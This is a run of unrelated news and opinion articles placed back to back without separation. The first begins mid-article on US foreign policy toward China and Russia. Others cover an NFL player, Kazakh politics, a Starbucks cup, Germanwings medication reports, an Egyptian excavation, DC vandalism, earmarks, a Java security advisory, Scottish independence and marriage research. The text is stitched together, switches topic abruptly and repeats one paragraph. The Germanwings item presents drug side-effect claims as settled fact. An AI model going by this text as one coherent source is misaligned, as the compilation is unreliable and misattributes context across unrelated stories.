Taiwan is not far behind. Even South Korea's Moon Jae In may be growing disenchanted with Beijing as it seeks to constrain Seoul's strategic defense options. And make no mistake, what China is doing in its littoral periphery is closely watched in India, where the rise of Chinese economic and military power is increasingly worrying. The Trump administration should closely monitor all these flash points along China's frontiers, any one of which could provoke a major military confrontation, if not next year, soon thereafter.
North Korea's nuclear weapons program is where China has most disappointed the White House. Xi Jinping has played the United States just like his predecessors, promising increased pressure on Pyongyang but not delivering nearly enough. The most encouraging news came as 2017 ended, in the revelation that Chinese and American military officers have discussed possible scenarios involving regime collapse or military conflict in North Korea. While unclear how far these talks have progressed, the mere fact that China is engaging in them shows a new level of awareness of how explosive the situation is. So, 2018 will be critical not only regarding North Korea's nuclear weapons threat but also whether Sino-American relations improve or take a distinct turn for the worse.
On Russia, the president has not given up on Vladimir Putin, at least not yet, but that may well come in 2018. Putin is an old-school, hard-edged, national interest-centered Russian leader, defending the “rodina” (the motherland), not a discredited ideology. Confronted with U.S. strength, Putin knows when to pull back, and he is, when it suits him, even capable of making and keeping deals. But there is no point in romanticizing the Moscow-Washington dynamic. It must be based not on personal relationships but on realpolitik.
No better proof exists than Russia's reaction to Trump's recent decision to supply lethal weapons to Ukraine, which is now a war zone entirely because of Russian aggression. To hear Moscow react to Trump's weapons decision, however, one would think he was responsible for increased hostilities. President Obama should have acted at the first evidence of Russia's military incursion into Ukraine, and even Trump's aid is a small step compared to President Bush's 2008 proposal to move Kiev quickly toward NATO membership. Nonetheless, every independent state that emerged from the Soviet Union, NATO member or not, is obsessed with how America handles Ukraine. They should be, because the Kremlin's calculus about their futures will almost certainly turn on whether Trump draws a line on Moscow's adventurism in Ukraine.
Just as troubling as Russia's menace in Eastern and Central Europe is its reemergence as a great power player in the Middle East. Just weeks ago, the Russian Duma ratified an agreement greatly expanding Russia's naval station at Tartus, Syria. In 2015, Obama stood dumbfounded as Russia built a significant air base in nearby Latakia, thus cementing the intrusion of Russia's military presence in the Middle East to an extent not seen since Anwar Sadat expelled Soviet military advisers and brought Egypt into the Western orbit in the 1970s.
This expansion constitutes a significant power projection for the Kremlin. Indeed, it seems clear that Russia's support (even more than Iran's) for Syria's Assad regime has kept the dictatorship in power. Russia's assertiveness in 2017 also empowered Tehran, even as the ISIS caliphate was destroyed, to create an arc of Shia military power from Iran, through Iraq and Syria, linking up with Hezbollah in Lebanon. This Russian-Iranian axis should rank alongside Iran's nuclear-weapons program on America's list of threats emanating from the Middle East.
Finally, the pure folly of both the U.N. Security Council and the General Assembly crossing the United States on the Jerusalem embassy decision was a mistake of potentially devastating consequences for the United Nations. Combined with the International Criminal Court's November decision to move toward investigating alleged U.S. war crimes in Afghanistan, there is now ample space for the White House to expand on the president's focus on protecting American sovereignty.
Trump's first insight into the rage for “global governance” among the high minded came on trade issues, and his concern for the World Trade Organization's adjudication mechanism. These are substantial and legitimate, but the broader issues of “who governs” and the challenges to constitutional, representative government from international bodies and treaties that expressly seek to advance global governing institutions are real and growing. America has long been an obstacle to these efforts, due to our quaint attachment to our Constitution and the exceptionalist notion that we don't need international treaties to “improve” it.
No recent president has made the sovereignty point as strongly as Trump, and the United Nations and International Criminal Court actions in 2017 now afford him a chance to make decisive political and financial responses in 2018. If 2017 was a tumultuous year internationally, 2018 could make it seem calm by comparison.

Saints defensive end Cameron Jordan is under investigation for an incident at a nightclub that occurred over the weekend, according to a report by New Orleans television station WWL.
WWL, citing sources, reported that the incident occurred at Republic nightclub late Saturday night or early Sunday morning. A man and his girlfriend filed a complaint Sunday morning concerning misdemeanor sexual battery. The couple allege Jordan swatted the woman on her backside and then had a minor scuffle with her boyfriend.
MORE: NFL players arrrested in 2015
The Saints signed their 2011 first-round draft pick to a five-year, $60 million extension in June. New Orleans released last year's team sack leader, Junior Galette, following his own assault allegations.
Jordan has reportedly been cooperative with police about the incident, and no arrest warrant or charges have been filed.
Jordan could be subject to NFL discipline if he is found to have violated the league's personal conduct policy. An NFL spokesman would not confirm to WWL whether the league is looking into the incident.
The 6-4, 287-pound Jordan has 29 sacks in four seasons for New Orleans. He had a career-high 12.5 in 2013, but disappointed with only 7.5 last season. He was selected 24th overall by the Saints in 2011, the same year they traded up to get running back Mark Ingram with the 28th overall pick.
Kazakhstan's culture minister has sparked resentment with remarks about neighboring Kyrgyzstan and its turbulent recent history.
The comments by Culture and Sports Minister Arystanbek Mukhamediuly, during a discussion about the late Kyrgyz writer Chingiz Aitmatov, also underscored the jittery Kazakh government's fears of unrest amid an economic downturn and public anger over new land-use legislation.
"Aitmatov wanted to prevent his people from taking…senseless steps," Mukhamediuly said on May 24. "And really he forecast those negative events that we have witnessed in Kyrgyzstan."
"When I go to Moscow, it is painful for me to see how young Kyrgyz girls have to clean public toilets there. Since there are no jobs, no prospects in their country, Kyrgyz have to leave," he said.
The remarks sparked criticism in both Kazakhstan and Kyrgyzstan, with Internet users calling Mukhamediuly "uneducated," "arrogant," "ignorant," and "stupid."
Many in Kyrgyzstan found the comments offensive; some called for Mukhamediuly to be declared persona non grata and barred from entering the country.
People in the two neighboring Central Asian states were puzzled by the minister's link between Aitmatov, a revered writer and thinker, and the phenomenon of Kyrgyz migrant workers in Russia – where many go to earn a living amid persistent economic troubles in Kyrgyzstan.
In the context of Kazakhstan's recent unrest, Kyrgyz historian Ainura Arzymaytova said Mukhamediuly's motive seems clear: He was invoking Aitmatov, and the political upheavals of post-Soviet Kyrgyzstan, to urge Kazakhs to stay off the streets and steer clear of protests.
While authoritarian Kazakh President Nursultan Nazarbaev has ruled the oil-producing country since the Soviet era, antigovernment protests have twice ousted presidents in Kyrgyzstan, in 2005 and 2010.
"I suppose this Kazakh official was trying to hint to his people … 'Look what happened to Kyrgyz people after their revolutions,'" Arzymaytova, a professor at Jusup Balasagun Kyrgyz National University in Bishkek, told the news site Vesti.kg on May 24. "It was some kind of maneuver to distract Kazakh citizens from their problems by offering them our problems to discuss."
Kazakhstan authorities have struggled to suppress a wave of protest over a land-privatization plan that critics fear will be riddled with corruption and put large tracts of agricultural land in the hands of foreigners.
Astana's Carrot & Stick Approach
Anger over the plan has dovetailed with public concern over the economy, which is stronger than those of neighbors such as Kyrgyzstan and Tajikistan but has been hit hard by the drop in world oil prices and repercussions from Russia's persistent recession.
In mosques across Kazakhstan, imams often start their sermons and prayers by calling on Muslims to respect "ethnic concord and economic stability" in the country -- which many interpret as an exhortation not to complain or protest.
Nazarbaev's government has used both concessions and forceful measures to attempt to avert unrest. Nazarbaev announced earlier this month that implementation of the land privatization would be postponed until 2017, and police detained hundreds of activists and journalists last week to thwart plans for major new protests on May 21.
The scale of the protests held so far and the number of those ready to demonstrate is unprecedented in post-Soviet Kazakhstan. The fatal shooting of at least 16 people by authorities dispersing protesting oil workers in the southwestern town of Zhanaozen in 2011 has added to the reluctance to demonstrate.
While Mukhamediuly has not commented publicly on the angry reaction to his remarks, several public figures in Kazakhstan have apologized on his behalf – while echoing the criticism.
"The minister's words expressed yesterday have caused hot discussions and resentment in Kyrgyz society. We would like to apologize to the people of Kyrgyzstan for the minister's words," several public figures including government critic Mukhtar Taizhan, who is a member of a hastily-created state commission on land reform, said in separate statements on Facebook.
"Unfortunately, some ministers of culture do not possess any culture," the statements said.
Kazakhs and Kyrgyz have close historical, linguistic, religious, and cultural ties.
'You want attitude with that?' Starbucks employee wrote b**** on customer's coffee cup
A New York woman bought her usual Starbucks coffee as she did every morning, but this one came with an extra serving of attitude.
Vicki Reveron has been a loyal customer of the coffee chain for years and her morning cup of joe is an indulgence she enjoys every day.
But she said she received the shock of her life last week when the cup containing her caramel frappuchino had the word b*** on the side instead of her name.
SCROLL DOWN FOR VIDEO
Loyal customer: Vicki Reveron was shocked to see the word 'b****' scrawled on her coffee cup
Insult: She said the letters for her order CRF - caramel frappuchino - were clearly written on the cup as was the other word
She said: 'I was shocked. I didn't understand why they would do that. It says "b****", my name is not b****, it's Vicki.'
Ms Reveron said there had been a mix up in her order at the Starbucks branch she goes to close to her work but didn't think there was any ill feeling when she left.
But when she got back to her office, she noticed what was written on her cup.
She told ABC 7's On Your Side: 'We made light of the mistake the order taker had made so I mean no harm no foul, but unfortunately he took it another way.
'There was a B-I-T-C and what looks like a scribbled H. I feel degraded about the whole thing. It's a degrading word here.'
When she went back to Starbucks to complain, she said the manager gave her vouchers for free coffee but when she asked for her cup with the incriminating evidence on it, there was one catch.
Location: The Starbucks branch in the Hell's Kitchen area of New York where Ms Reveron said she bought the coffee
Incriminating evidence: Ms Reveron said the letters B-I-T and C are clearly visible as well as what looks like a scrawled H
Franchise: The manager at the store said it was simply a mistake and apologised for any inconvenience or offence caused
She explained: 'He said to me "OK, we will give it back to you but you can't associate the cup with the location".'
As she walked out one of the employees allegedly said: 'Some people will do anything to get a free cup of coffee,' according to Ms Reveron, which she said made her feel humiliated.
ABC 7's On Your Side asked the manager of the store what happened and she said it was a mistake rather than a joke, while a spokesman at the headquarters in Seattle said: 'We have apologised numerous times for this unfortunate misunderstanding.'
Ms Reveron said she will no longer buy her morning coffee at Starbucks.
Eight days before crashing Germanwings flight 9525 into the French Alps, co-pilot Andreas Lubitz – who was already on the maximum dose of Mirtazepine, which is known to cause suicidal thoughts – was put on “further antidepressants,” according to the German newspaper Bild. Two days later, according to a June, 2015 article in Süddeutsche Zeitung, Lubitz began to “desperately” google ways to commit suicide. The antidepressant Citalopram, which is known to cause “severe” thoughts of suicide, was found in Lubitz' body.
Lubitz wrote, in a desperate, final email to his psychiatrist two weeks before slamming his A320 jet into the French Alps one year ago, that the antidepressant Mirtazepine made him “restless” and was causing him to “panic.” Mirtazapine's reported side effects include anxiety, confusion, thoughts of self-harm, “strange dreams,” and visual problems. Lubitz blamed the medication for inducing fears about losing his sight.
International Business Times →
An email sent by Andreas Lubitz, 27, to his doctor two weeks before the crash has been published by German newspaper Bild. The paper reports that Lubitz was taking the highest allowable dose of the antidepressant Mirtazapine, and that according to Lubitz' email the medication was making him “restless” and causing him to “panic” about losing his career due to his failing vision. Mirtazepine is a generic version of the “atypical antidepressant” Remeron, which has a suicide risk warning for younger people who take it.
Lubitz had consulted 41 different doctors in the five years before the crash. Two days after the crash a psychiatrist said to the police: “Do not tell me he has flown a plane.”

At the ancient city of Piramesse, which was Egypt's capital during the reign of the King Ramses II, an excavation team from the Roemer and Pelizaeus Museum in Hildesheim in Germany has uncovered parts of a building complex as well as a mortar pit with children's footprints.
The head of the Ancient Egyptian Antiquities Department at Egypt's antiquities ministry, Mahmoud Afifi, describes the newly discovered building complex as "truly monumental," covering about 200 by 160 metres.
The layout suggests the complex was likely a palace or a temple, Afifi told Ahram Online.
The mission director, Henning Franzmeier, explained magnetic measurements were carried out last year in order to determine the structure of the ancient city, and through those measurements the building complex was located.
The site of excavation had been chosen, he explained, not just because of its archaeological potential but because of its proximity to the edges of the modern village of Qantir, which is endangering the nearby antiquities under its fields due to rapid expansion.
Franzmeier told Ahram Online that the team has also uncovered an area of about 200 square metres in its excavations. It is the goal of this work to locate a potential entrance to the monumental building, which seems not to be located as is typical in the axis of the complex, but rather in its north-western corner.
Furthermore a second small trench was laid out in an area where the excavators believe the enclosure wall can be traced.
"The finds and archaeological features uncovered are most promising," he said, adding that just a couple of centimetres beneath the surface a multitude of walls was uncovered, all dating to the Pharaonic period.
Due to the limited size of the trenches no buildings can be reconstructed so far. Nonetheless it is obvious that the stratigraphy is extremely dense and several construction phases are preserved, and not all the walls are contemporaneous.
The team has also found a mortar pit extending to at least 2.5 by 8 metres. At the bottom, a layer of mortar was uncovered, in which children's footprints have been preserved. Even more extraordinary is the filling of the pit, consisting of smashed pieces of painted wall plaster.
"No motifs are recognisable so far but we are certainly dealing with the remains of large-scale multi-coloured wall paintings," said Franzmeier.
The team fragments have been cleaned in situ and subsequently removed. A comprehensive excavation of all fragments followed by permanent conservation and the reconstruction of motifs will be the subject of future seasons.

D.C. police announced the arrest of a woman Monday afternoon in the pouring of green paint in two chapels at Washington National Cathedral, according a police spokeswoman. Paint was also found splashed on a Smithsonian statue, and on Friday, on the Lincoln Memorial.

D.C. Police announced the arrest of a woman Monday afternoon in connection with pouring green paint in two chapels at the Washington National Cathedral, according a police spokeswoman. Paint was also found splashed on a Smithsonian statue, and on Friday, on the Lincoln Memorial.
A wave of vandalism continued to mar some of Washington's more popular landmarks Monday with at least three more attractions spattered with green paint, and authorities announced the arrest of a woman near one of the incidents at Washington National Cathedral.
The latest crimes occurred three days after the Lincoln Memorial was hit in similar fashion. On Monday, the light-green paint was discovered on an organ in the cathedral's Bethlehem Chapel, in the cathedral's Children's Chapel and on the granite base of a statue next to the Smithsonian Castle on the Mall.
D.C. police said Monday evening that they had charged Jiamei Tian, 58, whom they believe to be homeless, with one count of defacing property.
The mysterious markings on the statue of Abraham Lincoln blemished one of the country's most visited attractions and an iconic symbol of freedom. In the cathedral, they tarnished what is widely known as the nation's house of worship — and a building still under repair after an earthquake two years ago caused such severe damage that it closed for three months.
A church spokesman called the destruction “heartbreaking” but said it could be repaired. The cathedral was closed for several hours Monday afternoon — the first time since the earthquake — but it reopened in time for an evening concert with its choir and the Choir of the Basilica of the National Shrine of the Immaculate Conception.
(The Washington Post)
“It's just disappointing,” said Nick Schwei, 25, from Milwaukee, who tried to tour the cathedral but was turned away by police. “First the Lincoln Memorial, now this. It's just very sad. Two different incidents of beautiful things damaged.”
Authorities were still trying to determine late Monday whether any of the destruction is connected. They said they would test paint samples to determine whether the same material was used at each of the locations.
By evening, investigators with the U.S. Park Police, who are probing the spatters on the Mall, had arrived at the D.C. police department's 2nd District station, where Tian was being questioned. According to two police officials with knowledge of the investigation, the Park Police, in their investigation of the Lincoln Memorial incident, had been looking for an Asian woman who possibly was homeless.
She had been arrested in the Children's Chapel as D.C. police searched the church after paint was found about 2 p.m. on an organ in the Bethlehem Chapel. The basement chapel, built in 1912, is one of the oldest parts of the building. It was the site of President Woodrow Wilson's funeral in 1924 and his entombment for several decades.
Authorities said the paint was still wet, and the fresh crime scene prompted a quick response and frantic search through a labyrinth of chapels and alcoves. Authorities then found more paint — and the woman— in the Children's Chapel, just off the nave. The small prayer room is built to the scale of a 6-year-old child, with a baptismal font and small kneelers.
Pictures of the damage released by the cathedral show paint sprayed or thrown onto an organ's pipes in the Bethlehem Chapel. Paint is also visible on the floor and on a large card identifying the organ, which was built in the 1950s. In the Children's Chapel, the paint is evident on the floor and on the sides of church pews. The paint also damaged a mural.
Cathedral spokesman Richard Weinberg said workers would soon begin scrubbing off the paint. He estimated the damage at $15,000.
More than 1,000 people a day typically tour the cathedral during the high season; the church draws about a half-million visitor a year. On Monday, those who came made the best of the unexpected closure.
On the hilltop alongside Wisconsin Avenue NW, where the limestone cathedral soars above the city, children chased each other across the sun-flecked lawn and camera-toting tourists snapped photos and chatted in several languages.
Melanie Martinez, 30, of east Texas had been on a tour that started at 3:30 p.m., but the group was ushered out without explanation after about 20 minutes.
“I don't know why anyone would destroy our history,” she said. “There was so much more that I wanted to see. I'd like to go up in the tower.” She might come back before her vacation ends Friday.
The cathedral was closed when Sybille Eder, visiting from Kiel, Germany, arrived with her family. “I think people just do vandalism to get the attention of the press,” she said.
Another report Monday described paint found on a statue of Martin Luther in Northwest Washington's Thomas Circle. Gwendolyn Crump, a D.C. police spokeswoman, said police are aware of the report and are investigating.
The damage at the Lincoln Memorial was first reported about 1:30 a.m. Friday by people out for a late-night stroll. One of the women told The Washington Post that she discovered two 20-ounce Mountain Dew bottles overflowing with green and white paint, as well as white footprints near the inscription of the Gettysburg Address.
Carol Johnson, a spokeswoman for the National Park Service, said that workers have removed 90 percent of the paint but that it will be several more days before scaffolding alongside the 91-ton statue is removed.
On Friday night, a man e-mailed The Post to say that green paint also been splashed on a statue near the Smithsonian Castle, the museum's administrative headquarters. A spokeswoman for the Park Service, as well as the Park Police, said no such damage had occurred.
On Monday morning, Linda St. Thomas, the chief spokeswoman for the Smithsonian Institution, said green paint was found splotched in two places on the base of the bronze statue of Joseph Henry outside the Smithsonian Castle. Henry was the museum's first secretary, and he died in the Castle in 1878.
St. Thomas said the paint will be removed within one or two days.

Conservative lawmakers and groups are speaking out in opposition to a House Republican proposal to revive the practice of earmarking in the next Congress.
Earmarks are congressionally directed spending to a special interest. They've been banned under House rules since 2010. But on Wednesday, three GOP lawmakers plan to offer an amendment to those rules allowing them once again.
The vote will be conducted by secret ballot during a closed-door meeting of House Republicans, leaving conservatives fearful that the amendment could be adopted.
The Daily Signal obtained a copy of the amendment Monday night. Since then, several lawmakers have voiced their opposition to the plan while conservative groups rejected the gambit.
“If there was one unifying message in this year's election, it was that voters are sick and tired of how Washington does business,” Sen. Mike Lee, R-Utah, said in a statement to The Daily Signal. “It would be a violation of our promise to the American people if we went back to this corrupting practice.”
Sen. Jeff Flake, R-Ariz., who as a House member highlighted an “egregious earmark of the week,” derided the attempt to bring them back.
“Like indigestion, the desire for earmarks keeps coming back up,” Flake told The Daily Signal. “Let's face it. If we're trying to bring our popularity out of the basement, the last thing we need to do is indulge in more wasteful spending.”
Rep. Jim Jordan, R-Ohio, told The Daily Signal he would oppose the amendment.
“The takeaway from last week's election is that the American people are tired of business as usual in Washington,” said Jordan, who is chairman of the House Freedom Caucus. “That means come January, no earmarks or other special deals for special interests, period.”
The new GOP proposal is sponsored by Reps. John Culberson of Texas, Mike Rogers of Alabama, and Tom Rooney of Florida. The Daily Signal contacted each office for comment, but they did not respond.
The amendment would bring back legislative earmarks for some government agencies, including the Department of Defense, the Army Corps of Engineers, the Department of Homeland Security, and the Bureau of Reclamation. It also would allow lawmakers to provide earmarks for state and local governments, except for recreational facilities, museums, or parks.
If the amendment is adopted Wednesday, lawmakers would be able to request earmarks once again as long as the sponsoring member is identified, the earmarks initiate in committee, and they don't increase spending.
During the early 2000s, when Republicans controlled Congress and the presidency, earmarks came to symbolize wasteful government spending and pork-barrel projects such as the “Bridge to Nowhere” in Alaska. They also played a role in former GOP Rep. Duke Cunningham's bribery case. Cunningham, who spent time in prison, used earmarks in exchange for lobbyists' gifts.
Coming just days after the election of Donald Trump, who campaigned on a promise to “drain the swamp,” several conservative leaders said the move to bring back earmarks sent the wrong message to voters.
“Any attempt to roll back the longstanding ban on congressional earmarks—the lubricant that empowers politicians to cut bad deals—would amount to a rebuke of those voters,” said Michael Needham, chief executive of Heritage Action for America. “Americans deserve an honest, transparent government that is working for everyone, not simply doling out favors to a well connected few.”
Tea Party Patriots co-founder Jenny Beth Martin questioned whether members of Congress learned anything from last week's election.
“Any member of Congress who votes to bring back old-school, backroom, pork-barrel spending through earmarks is putting himself or herself firmly against the American people who just elected Donald Trump president, as he campaigned emphatically on the issue of draining the swamp in Washington,” she told The Daily Signal.
Club for Growth President David McIntosh said Wednesday's vote would be a test for Republicans if they were really listening to the American people's desire to clean up Washington.
“Like indigestion, the desire for earmarks keeps coming back up. Let's face it. If we're trying to bring our popularity out of the basement, the last thing we need to do is indulge in more wasteful spending.” —Sen. Jeff Flake, R-Ariz.
“Earmarks represent the worst of inside-the-beltway gamesmanship, by enticing members to vote for big government bills with the lure of getting tax dollars for big projects back in their districts,” McIntosh said. “Voters believed that Republicans would ‘drain the swamp,' not redirect it for their own benefit. Any effort to restore this kind of cronyism should be flatly rejected.”
Senate Conservatives Action President President Ken Cuccinelli urged House and Senate Republicans not overturn the ban on congressional earmarks.
“Americans are tired of politicians in Washington using their power to rig the system for special interests,” Cuccinelli said.” This kind of cronyism, which is at the very heart of the earmarking process, is exactly what Americans rejected at the polls this year. It would be a major mistake for Republicans to bring back earmarks as their first act after the elections. It would be a slap in the face to the millions of Americans who just voted to drain the swamp.”
Andy Koenig, vice president of policy at Freedom Partners, called on lawmakers to “flatly reject any effort to reinstitute earmarks.”
“Bringing back the earmark process that corrupted Washington for decades would be a direct insult to millions of Americans who signaled last week that they're tired of lawmakers putting special interests ahead of taxpayers,” Koenig said. “Hardworking Americans want their tax dollars spent wisely and transparently.”
FreedomWorks CEO Adam Brandon encouraged Republicans to pursue a bold conservative agenda rather than be bogged down by the taint of earmarks.
“It's incomprehensible that House Republicans, a week after voters sent a strong message to the Washington political establishment, would bring back earmarks—the currency of corruption,” Brandon said. “Earmarks became synonymous with cronyism and corruption in Congress, with Members handing out funding for the politically connected, and House Republicans were right to ban the practice in the first place.”
This isn't the first time Republicans have tried to resuscitate earmarks. In 2014, a similar earmark amendment was defeated by the GOP conference.
This is, however, the first time House Speaker Paul Ryan, R-Wis., will face a vote on earmarks under his leadership. Ryan's predecessor, former Rep. John Boehner, was a staunch opponent of earmarks.
“As long as I'm speaker, there will be no earmarks,” Boehner declared in an anti-earmark video from 2014.
Since then, some lawmakers have tried to ban the practice permanently. Reps. Jim Cooper, D-Tenn., and Mick Mulvaney, R-S.C., introduced the Earmark Elimination Act last year. It called for a permanent ban of legislative earmarks.
“Earmarks are what folks hate about politics—wasteful spending for Congress' pet projects,” Cooper said at the time. “There is a lot of talk about bringing earmarks back, but that's just rewarding Congress for bad behavior. It's time to crack down and ban earmarks forever.”

Java Remains Unsafe–Not Likely To Be Fixed Soon
Guess what? We're hearing reports this morning that the black hats are continuing to take advantage of security vulnerabilities in Java. Of course they are. That's what black hats do. We're also hearing from security experts that browser side Java isn't likely to be made secure in the near future.
Oracle's management of Java since obtaining it from Sun has been nothing short of a joke. It's about time for them to decide if they want to keep Java or not. If they don't want it, they need to spin it off or let it die. If they think it's a valuable part of their software portfolio, they should treat it as such and work overtime to make it safe.
In the meantime, we're standing behind our earlier assertion that Java browser plug-ins should be disabled until security experts say it's safe to enable them again. If you run web sites that depend on Java applets to run, find another way.
Here in the U.S., disabling Java plug-ins should have little to no effect on most people's Internet use. Here at FOSS Force we've had Java disabled in all of our browsers for years with absolutely no problem. However, users in other parts of the world may have trouble accomplishing some tasks, according to an article posted on PCWorld today:
“… In Denmark, for example, online banking and government websites use a log-in mechanism called NemID that requires Java support… Similar cases might exist in other countries. “In those cases, using the click-to-play feature in Chrome and Firefox, or the Zones mechanism in IE, could be used to let Java content load from only certain websites. A less technical solution would be to use one browser with Java disabled for general tasks, and a different browser with Java enabled for trusted websites that need Java support.”
[yop_poll id=”5″]
On Monday, Igor Soumenkov with Kaspersky Lab revealed in a blog entry that malware known by security researchers as Miniduke had been responsible for recently infecting computers in drive-by attacks using exploits in Java that have evidently since been patched. It had been thought that Miniduke mainly launched attacks through email phishing expeditions utilizing a now patched exploit in Adobe Reader 9, 10 and 11.
We've already reported that after setting on their hands through much of 2012, despite being told of numerous security holes in Java, Oracle has been busy pushing patches, fixing at least 52 security holes so far this year. Last week they issued an unscheduled patch fixing two vulnerabilities. At that time, five known security holes remained which have not yet been addressed. Oracle's next security patch is scheduled to be issued April 16.
According to PCWorld, Adam Gowdiak, the security researcher who's responsible for finding many if not most of Java's recent security issues, thinks that Oracle may be unable to effectively deal with their Java problem:
“There are indications that Oracle's developers are unaware of Java's security pitfalls and that code security reviews are either not done at all or not comprehensive enough, Gowdiak said. Many of the issues identified by Security Explorations violate Oracle's own secure coding guidelines for Java, he said. “‘We found many flaws which should have been eliminated by the company at the time of a comprehensive security review of the platform prior to its release,' Gowdiak said.”
With most security experts not expecting browser side Java to be made safe anytime soon, we can't stress enough how important it is that users disable Java at this time. Linux users can find instructions for disabling Java in most browsers in an article we published in January.

Image copyright Getty Images Image caption Mr Corbyn described a referendum as "unnecessary and unwanted" in a speech in Glasgow on Sunday
Jeremy Corbyn has said he will "open discussions" with the Scottish government over an independence referendum if he wins the election.
But the Labour leader said he would "ask them to think very carefully about it".
He also insisted he would not do a deal with the SNP to gain power at Westminster.
The Conservatives claimed Mr Corbyn and the SNP were already working on a potential post-election arrangement.
The Labour manifesto commits the party to opposing a referendum, which it describes as "unwanted and unnecessary" - with Mr Corbyn predicting independence would lead to "turbo-charged austerity".
And Scottish Labour's manifesto states that it will "never" support independence - with leader Kezia Dugdale giving a "cast-iron guarantee" that her party will oppose a second referendum.
But earlier this year, Mr Corbyn said he would be "absolutely fine" with a referendum being held if the Scottish Parliament voted for one.
SNP leader Nicola Sturgeon, who is Scotland's first minister, wants a referendum in the autumn of next year or the spring of 2019, with the Scottish Parliament formally backing her call in March.
However, she would need the consent of the UK government for a legally-binding vote to be held - and Prime Minister Theresa May has repeatedly said that "now is not the time".
On Monday, Mr Corbyn was asked in an interview with Bauer and Global radio stations what he would say to Ms Sturgeon if he was to become prime minister after the election on 8 June.
'Listen very carefully'
He replied: "I'll obviously open discussions with the government in Scotland and listen very carefully to what the Scottish Parliament says.
"I would ask them to think very carefully about it and suggest it would be much better to have this question dealt with at the conclusion of what are very serious and very important Brexit negotiations.
"I am utterly determined to achieve tariff free trade access to the European markets to protect manufacturing and service jobs all across the UK, all across Scotland, Wales and England as well of course."
A spokesman for Mr Corbyn later insisted: "Jeremy Corbyn and Scottish Labour have repeatedly said that a second independence referendum is both unwanted and unnecessary. Labour firmly opposes a second independence referendum".
In a BBC interview at the weekend, Ms Sturgeon said she would try to form an alliance to pursue "progressive policies" and keep the Conservatives out of government if the general election results in a hung parliament.
But she also predicted that the Conservatives would win another majority - and said Mr Corbyn was not credible as a potential prime minister.

Responding to her comments, Mr Corbyn said: "There will be no deals. There will be no alliance. We're fighting this election to win.
"Only Labour or the Tories can win this election and voting Labour is the only way to remove Theresa May from office and build a Scotland for the many not the few."
Meanwhile, Mrs May warned Conservative activists that the party has only to lose six seats for its Commons majority to disappear, opening the way to Downing Street for Labour.
The prime minister said: "That could mean in just 10 days' time a government in chaos, Jeremy Corbyn in No 10, John McDonnell in the Treasury, Diane Abbott in the Home Office and Nicola Sturgeon and the Lib Dems pulling the strings."
'Historical moment'
She added: "I've been clear talking about a second independence referendum in Scotland at this time.
"Now is not the time because what we need to be doing now as we face this historical moment as we need to get the Brexit negotiations right, what we need to do is to be working together and not pulling apart.
"I believe Nicola Sturgeon said yesterday that she didn't think Jeremy Corbyn was capable of being prime minister but at the same time also said that she would prop him up and push him into government."
Scottish Liberal Democrat MSP, Alex Cole-Hamilton said: "Much like Jeremy Corbyn's position on Brexit his position on independence has become confused and chaotic. Every time Jeremy Corbyn speaks somebody has to follow and clean up the mess.
"Scottish Labour must be pulling their hair out as last time I checked this wasn't their policy.
"Liberal Democrats are clear, every MP elected on the 8 June is a MP that will stand against the SNP's plan for another divisive independence referendum."
Marriage has long been linked to greater happiness, health, and well-being, at least in wealthy, Western cultures. Previous studies, though, could only hazard a correlation, and researchers warned of a likely significant selection bias at play. But a new paper, published by the National Bureau of Economic Research and based primarily on data from the United Kingdom, suggests that there's a real causal effect of getting married.

Even after controlling for pre-marital well-being levels, as well as other potentially confounding factors, marriage appears to increase life satisfaction, beyond the honeymoon period, and particularly during the slump in happiness that often accompanies middle age. The effect seems to have less to do with the legal institution than with the relationship; the benefit of co-habitating is almost as large. Noting that those who describe their partner as their best friend see double the boost in well-being, the researchers conclude that it is the friendship offered by a spouse or long-term partner that's most important. "Marriage, in a sense, is a super friendship,” the study's co-author Shawn Grover explained to the Huffington Post.

The fact that marrying your best friend seems to make middle age "slightly less terrible" seems less a ringing endorsement of marriage than an indictment of the way many of us spend our middle age.
Unsurprisingly, much media coverage of this research has taken a reductive and prescriptive tone, best epitomized by the New York Times' misleading headline: “Study Finds More Reasons to Get and Stay Married.” In reality, nobody is suggesting there's any benefit to staying in an unhappy marriage, which has consistently been shown to be at least as bad—and usually worse—for your physical and mental health as being unmarried. And analyses of survey data, particularly on subjective, self-reported well-being measures, should always be taken with a grain of salt. “Averages always obscure important variations,” says Stephanie Coontz, the director of research at the Council on Contemporary Families. “And that's especially true today, when there is no such thing as a typical marriage or a typical single person, and there are greater differences within each family type than there are between them.”
Plus, considering the privileged space marriage still occupies in our popular imagination and socio-economic structures, this new study starts to look about as surprising as one showing that the world's a little bit easier to navigate if you're right-handed.
After all, it's impossible to control for the enormous pressure people feel to get married in many cultures. Despite the fact that in the United States nearly half of adults are unmarried and more than a quarter of all households consist of only one person, there's a veritable romantic industrial complex—aimed especially at women—reminding us to couple up and settle down before we die alone. As a 2009 study exploring the stigma felt by never-married women in their late 20s to mid-30s put it: “The idealization of marriage and child rearing remains strong, pervasive, and largely unquestioned.” And while single people often invest in other close relationships—indeed, they typically have more active social lives than their married counterparts—we have yet to support alternative family structures. As my friend Samhita Mukhopadhyay, author of Outdated: Why Dating Is Ruining Your Love Life, says, “These alternatives are still very much at the margins of the dominant organizing principle of our society, which is the nuclear family—or heteronormative romantic structures.”
Conservatives wring their hands over the marriage gap between the rich and poor and claim that single mothers, who are disproportionately likely to live in poverty, need husbands rather than a living wage and a more robust social safety net.
It's not surprising, then, that the benefits of being married are most evident during middle age, when the marriage rate peaks—and with it, the peer pressure to join the club. Furthermore, as Natalia Sarkisian and Naomi Gerstel argue in their book Nuclear Family Values, Extended Family Lives: The Importance of Gender, Race, and Class, marriage is a fairly “greedy” institution—married people tend to invest less time in their relationships with friends, extended family, and the broader community. Though it's not something Sarkisian and Gerstel have looked at specifically in their research, it seems likely that this domestic nesting would be especially acute in middle age, when career and child-rearing duties pile up.
And while its effects may be felt by those who remain single and find their support networks weakened as their married friends become less available, it hardly serves the married that well either, as recent articles on the difficulty of making and maintaining friendshipsin (married) middle age attest. No wonder people whose spouses also happen to be their best friends get such a greater benefit from marriage than others. For some, this particular “super-friend” may well be one of the only close friends they see with any regularity—it helps to really, really like them.
Looked at from that angle, the fact that marrying your best friend seems to make middle age “slightly less terrible” (as the headline of the Washington Post's coverage of the study sardonically boasts) seems less a ringing endorsement of marriage than an indictment of the way many of us spend our middle age—in socially isolated domestic units, each consumed with the nearly impossible task of balancing work and family, made bearable only by having a close friend in the trenches with us.
